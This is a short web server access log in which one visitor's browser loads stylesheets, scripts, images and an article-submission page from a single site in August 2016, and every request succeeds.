74.197.223.209 - - [08/Aug/2016:16:25:58 -0700] "GET /css/elements.css HTTP/1.1" 200 17857 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" "www.saveaslave.com"
74.197.223.209 - - [08/Aug/2016:16:25:58 -0700] "GET /gfeedfetcher.js HTTP/1.1" 200 9018 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" "www.saveaslave.com"
74.197.223.209 - - [08/Aug/2016:16:25:58 -0700] "GET /images/top.jpg HTTP/1.1" 200 50519 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" "www.saveaslave.com"
74.197.223.209 - - [08/Aug/2016:16:25:59 -0700] "GET /images/article/s1_dety_beg_d9954.jpg HTTP/1.1" 200 16968 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" "www.saveaslave.com"
74.197.223.209 - - [08/Aug/2016:16:25:59 -0700] "GET /css/style-pages.css HTTP/1.1" 200 9894 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" "www.saveaslave.com"
74.197.223.209 - - [08/Aug/2016:16:26:00 -0700] "GET /addarticle.php HTTP/1.1" 200 13682 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" "www.saveaslave.com"[1]
74.197.223.209 - - [08/Aug/2016:16:26:00 -0700] "GET /js/bootstrap.min.js HTTP/1.1" 200 37055 "http://www.saveaslave.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" "www.saveaslave.com"
